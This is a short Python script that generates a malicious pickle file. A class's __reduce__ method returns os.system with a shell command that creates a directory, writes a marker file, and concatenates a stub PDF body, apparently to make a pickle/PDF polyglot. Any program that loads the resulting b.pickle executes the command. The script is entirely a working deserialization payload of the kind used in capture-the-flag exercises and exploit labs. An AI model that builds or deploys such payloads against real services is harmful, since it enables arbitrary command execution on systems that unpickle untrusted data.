import pickle
import os
s='''
%PDF-1.4
%âãÏÓ
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Count 0 >>
endobj
xref
0 3
0000000000 65535 f 
1000000015 00000 n 
1000000064 00000 n 
trailer
<< /Size 3 /Root 1 0 R >>
startxref
107
%%EOF'''
class A:
    def __init__(self, aa):
        self.a = aa
    def __reduce__(self):
        return os.system, ('mkdir static;echo 11111>static/1.txt;'+self.a,)

with open("b.pickle","wb") as f:
    f.write(pickle.dumps(A(s)))